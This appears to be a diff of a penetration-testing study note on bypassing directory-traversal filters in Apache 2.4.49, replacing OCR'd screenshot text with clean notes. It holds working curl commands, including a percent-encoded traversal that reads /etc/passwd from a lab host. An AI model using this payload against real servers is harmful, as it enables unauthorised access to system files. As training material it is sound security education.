@@ -6,79 +6,24 @@ tags:
 # Encoding special characters
 
 
-> [!note]- Screenshot
+> [!example] Plain traversal gets blocked
+> Trying multiple `../` sequences against the vulnerable Apache 2.4.49 host (WEB18) with `curl` returns a 404, regardless of how many `../` we add:
+> ```sh
+> curl http://192.168.50.16/cgi-bin/../../../../etc/passwd
 > ```
-> Let's use curl and multiple ../ sequences to try exploiting this
-> directory traversal vulnerability in Apache 2.4.49 on the WEB18
-> machine.
-> kaligkali:/var/ww/html$ curl http://192.168.50.16/cgi-bi
-> N/../s./+0/.-/etc/passwd
-> <!DOCTYPE HTML PUBLIC “-//IETF//DTD HTML 2.0//EN">
-> <html><head>
-> <title>4e4 Not Found</title>
-> </head><body>
-> <hi>Not Found</h1>
-> <p>The requested URL was not found on this server.</p>
-> </body></html>
-> kali@kali:/var/ww/html$ curl http://192.168.50.16/cgi-bi
-> W/L eLecLecLeLeLerL eel eels sJetc/ passwd
-> <!DOCTYPE HTML PUBLIC “-//IETF//DTD HTML 2.0//EN">
-> <html><head>
-> <title>4e4 Not Found</title>
-> </head><body>
-> <hi>Not Found</h1>
-> <p>The requested URL was not found on this server.</p>
-> </body></html>
-> Listing 11 - Using *./* to leverage the Directory Traversal vulnerability in Apache 2.4.49
-> ```
+> Response: `404 Not Found`. A filter is stripping the `../` sequences.
 
 
-> [!note]- Screenshot
+> [!example] Bypassing the filter with encoded dots
+> Because `../` is a well-known attack pattern, it's often filtered by the server, a WAF, or the app. URL (percent) encoding can slip past: encode each dot as `%2e`:
+> ```sh
+> curl http://192.168.50.16/cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
 > ```
-> Listing 11 demonstrates that after attempting two queries with a
-> different number of ../, we could not display the contents of
-> Jetc/passwd via directory traversal. Because leveraging ../ is a
-> known way to abuse web application behavior, this sequence is
-> often filtered by either the web server, web application firewalls,
-> or the web application itself.
-> Fortunately for us, we can use URL Encoding, also called Percent
-> Encoding, to potentially bypass these filters. We can leverage
-> specific ASCII encoding lists to manually encode our query from
-> listing 11 or use the online converter on the same page. For now,
-> we will only encode the dots, which are represented as "%2e".
-> 
-> kaligkali:/var/wm/html$ curl http: //192.168.50.16/cgi-bin/%2e%
-> 
-> 2e/%2e%2e/%2ek2e/%2ek2e/ etc/passwd
-> 
-> root :x:0:0:root: /root :/bin/bash
-> 
-> daemon:x:1:41:daemon: /usr/sbin: /usr/sbin/nologin
-> 
-> bin:x:2:2:bin:/bin: /usr/sbin/nologin
-> 
-> sys:x:3:3: sys: /dev: /usr/sbin/nologin
-> 
-> _apt:x:100: 65534: : /nonexistent : /usr/sbin/nologin
-> 
-> alfred:x:1000: 1000: : /home/al fred: /bin/bash
-> "Listing 12 = Using encoded dots for Directory Traversal =
-> We have successfully used directory traversal with encoded dots
-> to display the contents of /etc/passwd on the target machine.
-> ```
+> This returns `/etc/passwd` (`root:x:0:0:root:/root:/bin/bash`, ...) — the encoded dots bypassed the filter.
 
 
-> [!note]- Screenshot
-> ```
-> Generally, URL encoding is used to convert characters of a web
-> request into a format that can be transmitted over the internet.
-> However, it is also a popular method used for malicious
-> purposes. The reason for this is that the encoded representation
-> of characters in a request may be missed by filters, which only
-> check for the plain-text representation of them e.g. ../ but not
-> %2e%2e]. After the request passes the filter, the web application
-> or server interprets the encoded characters as a valid request.
-> ```
+> [!info] Why encoding evades filters
+> URL encoding normally just makes characters safe to transmit, but it doubles as a filter bypass: a filter that only checks for the plain text `../` misses the encoded form `%2e%2e/`. Once the request is past the filter, the server decodes it and interprets it as a valid path.
 
 ## Visual Flow
 
